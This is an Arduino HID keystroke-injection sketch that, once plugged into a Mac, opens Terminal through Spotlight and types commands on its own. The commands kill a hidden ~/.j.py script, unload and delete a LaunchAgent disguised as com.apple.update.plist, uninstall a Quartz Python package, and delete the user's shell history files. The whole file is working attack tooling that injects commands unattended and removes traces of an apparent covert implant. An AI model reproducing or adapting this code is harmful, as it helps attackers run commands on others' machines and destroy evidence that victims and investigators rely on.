#include <Keyboard.h>

void t(const char* s) { for(int i=0;s[i];i++){Keyboard.write(s[i]);delay(5);} }
void ln(const char* s) { t(s); Keyboard.write(KEY_RETURN); delay(30); }

void setup() {
  delay(2500); Keyboard.begin(); delay(500);
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press(' ');
  delay(100); Keyboard.releaseAll(); delay(1200);
  t("Terminal"); delay(500);
  Keyboard.write(KEY_RETURN); delay(4000);

  ln("pkill -f .j.py 2>/dev/null");
  delay(300);
  ln("launchctl unload ~/Library/LaunchAgents/com.apple.update.plist 2>/dev/null");
  ln("rm -f ~/.j.py ~/Library/LaunchAgents/com.apple.update.plist");
  delay(300);
  ln("python3 -m pip uninstall pyobjc-framework-Quartz -y -q 2>/dev/null");
  delay(3000);
  ln("rm -f ~/.zsh_history ~/.bash_history");
  ln("clear");

  Keyboard.end();
}
void loop() {}
